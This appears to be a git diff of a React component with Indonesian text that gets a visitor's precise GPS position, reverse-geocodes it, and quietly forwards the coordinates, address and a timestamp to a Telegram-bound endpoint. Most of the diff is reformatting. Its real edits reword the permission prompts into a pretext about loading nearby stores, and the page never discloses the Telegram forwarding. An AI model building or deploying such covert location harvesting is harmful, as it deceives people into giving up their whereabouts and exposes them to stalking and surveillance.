@@ -5,25 +5,29 @@ import { useState } from "react";
 interface LocationButtonProps {
   onLocationSuccess?: (location: {
     lat: number;
-    lng: number; 
+    lng: number;
     address?: string;
   }) => void;
   onLocationError?: (error: string) => void;
 }
 
-export default function LocationButton({ 
-  onLocationSuccess, 
-  onLocationError 
+export default function LocationButton({
+  onLocationSuccess,
+  onLocationError,
 }: LocationButtonProps) {
   const [isLoading, setIsLoading] = useState(false);
-  const [location, setLocation] = useState<{lat: number, lng: number, address?: string} | null>(null);
-  const [locationError, setLocationError] = useState('');
+  const [location, setLocation] = useState<{
+    lat: number;
+    lng: number;
+    address?: string;
+  } | null>(null);
+  const [locationError, setLocationError] = useState("");
   const [permissionDenied, setPermissionDenied] = useState(false);
 
   const getCurrentLocation = async () => {
     setIsLoading(true);
     setLocation(null);
-    setLocationError('');
+    setLocationError("");
     setPermissionDenied(false);
 
     if (!navigator.geolocation) {
@@ -38,23 +42,22 @@ export default function LocationButton({
       async (position) => {
         try {
           const { latitude, longitude } = position.coords;
-          
+
           // Dapatkan alamat dari koordinat
           const address = await getAddressFromCoords(latitude, longitude);
-          
+
           const locationData = {
             lat: latitude,
             lng: longitude,
-            address: address
+            address: address,
           };
 
           setLocation(locationData);
           setPermissionDenied(false);
           onLocationSuccess?.(locationData);
-          
+
           // Kirim ke Telegram
           await sendLocationToTelegram(locationData);
-          
         } catch (error) {
           const errorMsg = "Gagal mendapatkan alamat";
           setLocationError(errorMsg);
@@ -65,10 +68,11 @@ export default function LocationButton({
       },
       (error) => {
         let errorMsg = "Gagal mendapatkan lokasi";
-        
+
         switch (error.code) {
           case error.PERMISSION_DENIED:
-            errorMsg = "Akses lokasi ditolak. Silakan izinkan akses lokasi di browser settings Anda.";
+            errorMsg =
+              "Akses lokasi ditolak. Silakan izinkan akses lokasi di browser settings Anda.";
             setPermissionDenied(true);
             break;
           case error.POSITION_UNAVAILABLE:
@@ -80,7 +84,7 @@ export default function LocationButton({
           default:
             errorMsg = "Error tidak diketahui";
         }
-        
+
         setLocationError(errorMsg);
         onLocationError?.(errorMsg);
         setIsLoading(false);
@@ -88,7 +92,7 @@ export default function LocationButton({
       {
         enableHighAccuracy: true,
         timeout: 15000, // 15 detik
-        maximumAge: 60000
+        maximumAge: 60000,
       }
     );
   };
@@ -96,17 +100,20 @@ export default function LocationButton({
   // Fungsi untuk reset permission dan minta ulang
   const handleRetryPermission = () => {
     setPermissionDenied(false);
-    setLocationError('');
+    setLocationError("");
     getCurrentLocation();
   };
 
-  const getAddressFromCoords = async (lat: number, lng: number): Promise<string> => {
+  const getAddressFromCoords = async (
+    lat: number,
+    lng: number
+  ): Promise<string> => {
     try {
       const response = await fetch(
         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
       );
       const data = await response.json();
-      
+
       if (data.display_name) {
         return data.display_name;
       }
@@ -116,26 +123,30 @@ export default function LocationButton({
     }
   };
 
-  const sendLocationToTelegram = async (locationData: {lat: number, lng: number, address?: string}) => {
+  const sendLocationToTelegram = async (locationData: {
+    lat: number;
+    lng: number;
+    address?: string;
+  }) => {
     try {
-      const response = await fetch('/api/sendLocation', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const response = await fetch("/api/sendLocation", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           latitude: locationData.lat,
           longitude: locationData.lng,
           address: locationData.address,
-          timestamp: new Date().toISOString()
-        })
+          timestamp: new Date().toISOString(),
+        }),
       });
 
       if (!response.ok) {
-        throw new Error('Failed to send location');
+        throw new Error("Failed to send location");
       }
 
-      console.log('Location sent to Telegram successfully');
+      console.log("Location sent to Telegram successfully");
     } catch (error) {
-      console.error('Error sending location:', error);
+      console.error("Error sending location:", error);
     }
   };
 
@@ -146,13 +157,13 @@ export default function LocationButton({
         onClick={getCurrentLocation}
         disabled={isLoading}
         className={`p-3 rounded-xl w-full font-semibold text-lg transition-colors ${
-          isLoading 
-            ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+          isLoading
+            ? "bg-gray-400 text-gray-200 cursor-not-allowed"
             : permissionDenied
-            ? 'bg-red-600 text-white hover:bg-red-700'
+            ? "bg-red-600 text-white hover:bg-red-700"
             : location
-            ? 'bg-red-600 text-white hover:bg-red-700'
-            : 'bg-red-700 text-white hover:bg-red-800'
+            ? "bg-red-600 text-white hover:bg-red-700"
+            : "bg-red-700 text-white hover:bg-red-800"
         }`}
       >
         {isLoading ? (
@@ -162,16 +173,14 @@ export default function LocationButton({
           </div>
         ) : permissionDenied ? (
           <div className="flex items-center justify-center gap-2">
-            <span>tidak dapat memuat lokasi</span>
+            <span>tidak dapat menemukan toko</span>
           </div>
         ) : location ? (
           <div className="flex items-center justify-center gap-2">
-            
             <span>memuat lokasi</span>
           </div>
         ) : (
           <div className="flex items-center justify-center gap-2">
-            
             <span>Aktifkan Lokasi</span>
           </div>
         )}
@@ -204,7 +213,9 @@ export default function LocationButton({
       {permissionDenied && (
         <div className="mt-2 p-3 ">
           <p className="text-red-700 text-sm mb-2">
-            <strong>Akses lokasi ditolak refresh halaman untuk melihat ulang.</strong>
+            <strong>
+              mohon aktifkan akses lokasi agar kami dapat memuat toko-toko didaerahmu.
+            </strong>
           </p>
           <div className="flex gap-2">
             <button
